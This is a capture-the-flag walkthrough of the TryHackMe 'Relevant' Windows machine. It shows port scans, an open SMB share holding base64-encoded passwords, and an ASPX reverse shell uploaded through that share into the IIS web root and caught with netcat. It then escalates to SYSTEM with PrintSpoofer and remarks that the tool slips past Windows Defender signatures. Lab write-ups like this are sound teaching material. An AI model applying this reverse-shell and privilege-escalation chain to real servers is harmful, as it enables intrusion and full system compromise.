---
layout: single
title: "Relevant"
link: "https://tryhackme.com/room/relevant"
parent: TryHackMe
os: Windows
difficulty: Medium
tags: [Smbclient, PrintSpoofer, Nmap, IIS]
starred: true
date: 2026-02-06
toc: true
toc_sticky: true
toc_label: "Mission Log"
toc_icon: "crosshairs"
---
# CTF Writeup: [{{ page.title }}]({{ page.machine_url }})
{% include ctf-badges.html %}

> **Link:** [**{{ page.parent }}**]({{ page.link }}) |
> **OS:** {{ page.os }} |
> **Difficulty:** {{ page.difficulty }} |
> **Date:** {{ page.date }} |
> **Author:** [*S3Z4R*](https://tryhackme.com/p/S3Z4R)

---
## 1. Reconnaissance
### Nmap Scan
Using `nmap` we have:
```bash
❯ nmap -sV -sC -T4 <Machine-IP>
Starting Nmap 7.92 ( https://nmap.org ) at 2026-02-06 12:56 CET
Nmap scan report for <Machine-IP>
Host is up (0.027s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2026-02-06T11:57:02+00:00
|_ssl-date: 2026-02-06T11:57:42+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2026-02-05T11:50:18
|_Not valid after:  2026-08-07T11:50:18
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb2-time:
|   date: 2026-02-06T11:57:06
|_  start_date: 2026-02-06T11:50:19
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
```
* **Pro Tip:** You can add `-p-` here to scan for services running on all `65,535` ports. 

### Smbclient
Since we have `smb` available we can look for more information:
```bash
❯ smbclient -L //<Machine-IP>/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk
SMB1 disabled -- no workgroup available
```
## 2. Initial Access
Using `smb` with the user `nt4wrksv` we can get an access to the smbclient to get a peek at what is there:
```bash
❯ smbclient -U nt4wrksv //<Machine-IP>/nt4wrksv
Password for [SAMBA\nt4wrksv]:
Try "help" to get a list of possible commands.
smb: \> ls
  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020

                7735807 blocks of size 4096. 4928029 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
```

```bash
❯ cat passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```
Using [Cyberchef](https://cyberchef.org) we can see that this is obfuscated by `Base64` and we can decode it to:
```bash
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```
So we have 2 users and 2 passwords now.

That is all the information we can get from `smb`, now we have to do a thorough `nmap` scan on all ports using `-p-`.

* **The Flaw:** The SMB share `nt4wrksv` is mapped directly to the IIS web root on port `49663`.
* **The Impact:** This misconfiguration allows an attacker to bypass file upload restrictions on the web server by writing the malicious payload (`shell.aspx`) directly to the SMB share, then executing it via the web browser.

### Nmap Part 2!
Using `nmap` we can find more ports open on the system:
```bash
❯ sudo nmap -p- -sV -sS -T4 -Pn <Machine-IP>
Starting Nmap 7.92 ( https://nmap.org ) at 2026-02-06 14:59 CET
Nmap scan report for <Machine-IP>
Host is up (0.027s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49663/tcp open  http          Microsoft IIS httpd 10.0
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 168.91 seconds
```
This tells us that there are indeed more ports open on higher numbers. Let's see what are they.

We know that `49663` is the same `IIS` we were having on port `80`, but with the difference that we can actually access the files in the SMB we had access earlier.
How? Check this: `http://<Machine-IP>:49663/nt4wrksv/passwords.txt`. You can see the file on `smb` we had. So let's use a `reverse shell` and execute it from the web.

### Reverse Shell
In order to get a reverse shell we need to find an `aspx` shell first. Thanks to [borjmz](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx) i found it! We can then edit the ip and port in the line 11:
```bash
	protected void Page_Load(object sender, EventArgs e)
    {
	    String host = "127.0.0.1"; //CHANGE THIS
            int port = 1234; ////CHANGE THIS
                
        CallbackShell(host, port);
```
We should log back into the `nt4wrksv` and then put the shell with `put` command as below:
```bash
smb: \> put shell.aspx
putting file shell.aspx as \shell.aspx (141.9 kb/s) (average 749.8 kb/s)
```
Then use `netcat` and listen on the same port and go to the url on the web `http://<Machine-IP>:49663/nt4wrksv/shell.aspx`. We'll have the shell after navigating to the url as here:
```bash
❯ nc -lnvp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from <Machine-IP>.
Ncat: Connection from <Machine-IP>:49771.
Spawn Shell...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```
Now we look for the first flag.

## 3. User Flag
We can navigate to `Users` to see what users are available and we can find `Bob` here. We can find `user.txt` here as below:
```bash
c:\Users\Bob\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users\Bob\Desktop

07/25/2020  01:04 PM    <DIR>          .
07/25/2020  01:04 PM    <DIR>          ..
07/25/2020  07:24 AM                35 user.txt
               1 File(s)             35 bytes
               2 Dir(s)  20,895,440,896 bytes free

c:\Users\Bob\Desktop>type user.txt
type user.txt
THM{fdk4...tf45}
```
You can navigate just like linux with `cd` and read files with `type`.

## 4. Privilege Escalation
Now we need new permissions. First let's see who we are?
```bash
c:\Users\Bob\Desktop>whoami
iis apppool\defaultapppool
```
And what are we capable of?
```bash
c:\Users\Bob\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
We can see `SeImpersonatePrivilege` is also enabled. We might be able to use it.

* **Impersonation:** It is a feature that allows a program to **act** as another user.
* **Vulnerability Analysis `SeImpersonatePrivilege`:** The IIS service account `iis apppool\defaultapppool` holds `SeImpersonatePrivilege`. This privilege is designed to allow a service to impersonate a client connecting to it. PrintSpoofer abuses this by forcing the `SYSTEM` account to connect to a named pipe controlled by the attacker. Once `SYSTEM` connects, the attacker's process impersonates it, granting a full `NT AUTHORITY\SYSTEM` shell.

In order to look for this exploit, first we need to know if the windows OS version supports it or not. We can run `systeminfo` to see:
```bash
c:\Users\Bob\Desktop>systeminfo
systeminfo

Host Name:                 RELEVANT
OS Name:                   Microsoft Windows Server 2016 Standard Evaluation
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00378-00000-00000-AA739
Original Install Date:     7/25/2020, 7:56:59 AM
System Boot Time:          2/6/2026, 6:14:20 AM
System Manufacturer:       Amazon EC2
System Model:              t3a.micro
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2200 Mhz
BIOS Version:              Amazon EC2 1.0, 10/16/2017
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     1,000 MB
Available Physical Memory: 465 MB
Virtual Memory: Max Size:  2,024 MB
Virtual Memory: Available: 1,229 MB
Virtual Memory: In Use:    795 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB3192137
                           [02]: KB3211320
                           [03]: KB3213986
Network Card(s):           1 NIC(s) Installed.
                           [01]: Amazon Elastic Network Adapter
                                 Connection Name: Ethernet 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.81.128.1
                                 IP address(es)
                                 [01]: <Machine-IP>
                                 [02]: fe80::dd97:7a3c:c234:b296
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
Great! Now let's see what can we find for `indows Server 2016 Standard (Build 14393) SeImpersonatePrivilege`. We can see that there are couple of exploits available. The one we will use is called `Juicy Potato`.

### Juicy Potato
Juicy Potato works on almost all Windows versions up until *Windows 10 Build 1809* and *Windows Server 2019*. After those versions, Microsoft changed how the *DCOM* service behaves, which spoiled the Potato (requiring newer tools like PrintSpoofer or GodPotato).

With that knowledge at hand, we can now act!

First we need to download the tool from [here](https://github.com/ohpe/juicy-potato/releases) and send it to the server.

* To send we can just use the `smb` method we discoverd earlier.

Unfortunately the windows defender is removing the tool instantly! We have switch the tool. We can try using [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases). I downloaded `x64` for this room.

### PrintSpoofer
Instead of DCOM which was used by Juicy Potato, PrintSpoofer targets the `Print Spooler service`:
```bash
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c "cmd.exe"
PrintSpoofer64.exe -i -c "cmd.exe"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
* As we saw, Windows Defender has very strong signatures for "Potato" tools. PrintSpoofer is a different "family" of exploit and often slips past signatures that are tuned to look for DCOM-based attacks.

So this works because `we are abusing the SeImpersonatePrivilege via pipe impersonation`.
OK let's continue. . .

## 5. Root Flag
Now that we have `authority\system` privilege to roam around.

Let's head back to the `Users` directory and take a peek into the `Administrator` folder:
```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
THM{1fk5...45pv}
```
The final flag was in this folder and we found it!


---

{% comment %}

[Technique]: SMB Enumeration
[Command]: smbclient -L <IP> -N
[Why]: Lists available shares on the target machine without providing a password.

[Technique]: Privilege Escalation (PrintSpoofer)
[Command]: PrintSpoofer64.exe -i -c "cmd.exe"
[Why]: Abuses the SeImpersonatePrivilege via pipe impersonation to gain SYSTEM access.

[Technique]: Port Scanning (Specific)
[Command]: nmap -p 49663 --script http-ntlm-info <IP>
[Why]: Identifies information about the IIS server running on a high non-standard port.

{% endcomment %}
